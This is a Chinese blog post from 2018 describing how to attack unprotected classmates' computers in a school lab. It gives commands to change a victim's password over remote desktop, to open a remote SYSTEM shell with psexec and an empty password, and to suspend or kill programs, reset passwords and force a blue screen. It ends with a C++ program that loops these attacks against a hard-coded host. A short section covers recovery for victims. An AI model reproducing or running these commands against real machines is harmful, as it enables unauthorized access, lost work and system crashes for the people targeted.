---
author: Duanyll
tags: ["搞事情"]
date: 2018-10-24
title: 论给电脑设密码的重要性——机房惨案的新境界
---

昨天颓了半个晚自习研究机房惨案黑科技，感受到了机房电脑不设密码又不开防火墙还不开UAC的巨大风险……

> # **在机房实际运用以下内容可能导致您被教练锤，被同学揍或者是更加严重的后果！**

<!-- more -->

以下内容的前提是对方没设密码

## net user 改密码制造对方断不掉的远程桌面连接

基础：`net user admin fuck`把admin的密码设为`fuck`

1. 把`net user admin fuck`复制到剪贴板里
2. 用远程桌面连你要机惨的人
3. 迅速按下`Win+r`,`Ctrl+v`,`Enter`
4. 然后他除了重启就断不掉链接了，他的电脑上会提示“用户名或密码错误”，但是连密码输入框都不显示，趁机让他在洛谷上AKIOI吧

## psexec 静默打开cmd

1. 去搜索下载一个psexec（SysinternalsSuite里面有）
2. cmd运行`psexec \\他的IP -u admin -s cmd`
3. 提示输入密码，直接回车，如果直接进入他的cmd你就中奖了
4. 你就可以在cmd里面改他的密码，删他的程序，给他的iostream加点料了

## 如果你被搞了

1. 远程桌面型：告诉教练或者揍他
2. psexec型（很难察觉）：迅速`net user admin ""`清除密码，注销重登
3. 没有还原卡：重启按F8，选带命令提示符的安全模式，用上面指令清密码，重启

## 再补充几条

```sh
pssuspend \\stu5-xxx -u admin explorer.exe #卡住他的桌面（可以换成别的程序）
pssuspend \\stu5-xxx -u admin explorer.exe -r #恢复他的桌面
pskill \\stu5-xxx -u admin devcpp.exe #强杀devcpp（不会保存代码）
pspasswd \\stu5-xxx -u admin admin fuck #一键改他的密码
notmyfaultc crash 0x01 #瞬间蓝屏（自己的电脑）
```

pssuspend配合while(true)与sleep效果奇佳。

## 一段振奋人心的代码

请在sysinternals suite里面执行。方便起见，我把主机名写死在代码里了。

```cpp
#include <cstdlib>
#include <iostream>
#include <cstdio>
#include <ctime>
#include <windows.h>

using namespace std;

int main(){
	srand(time(NULL));
	system("psexec \\\\xxx -accepteula -u admin -p \"\" -s net user Administrator /active:yes");
	system("psexec \\\\xxx -accepteula -u admin -p \"\" -s net user Administrator happy");
	while(1){
		Sleep(500);
		switch(rand()%13){
			case 0:
				system("pssuspend \\\\xxx -accepteula -u Administrator -p \"happy\" chrome");
				break;
			case 1:
				system("pssuspend \\\\xxx -accepteula -u Administrator -p \"happy\" devcpp");
				break;
			case 2:
				system("pssuspend \\\\xxx -accepteula -u Administrator -p \"happy\" explorer");
				break;
			case 3:
				system("pssuspend \\\\xxx -accepteula -u Administrator -p \"happy\" taskmgr");
				break;
			case 4:
				system("pssuspend \\\\xxx -accepteula -u Administrator -p \"happy\" chrome -r");
				break;
			case 5:
				system("pssuspend \\\\xxx -accepteula -u Administrator -p \"happy\" devcpp -r");
				break;
			case 6:
				system("pssuspend \\\\xxx -accepteula -u Administrator -p \"happy\" explorer -r");
				break;
			case 7:
				system("pssuspend \\\\xxx -accepteula -u Administrator -p \"happy\" taskmgr -r");
				break;
			case 8:
				system("pskill \\\\xxx -accepteula -u Administrator -p \"happy\" chrome");
				break;
			case 9:
				system("pskill \\\\xxx -accepteula -u Administrator -p \"happy\" devcpp");
				break;
			case 10:
				system("pskill \\\\xxx -accepteula -u Administrator -p \"happy\" explorer");
				break;
			case 11:
				system("pskill \\\\xxx -accepteula -u Administrator -p \"happy\" taskmgr");
				break;
			case 12:
				int p = rand()%100;
				if(p==0){
					system("pskill \\\\xxx -u Administrator -p \"happy\" -c -d -s notmyfaultc.exe crash 0x01 -accepteula");
				}
				break;
		}
	}
}
```
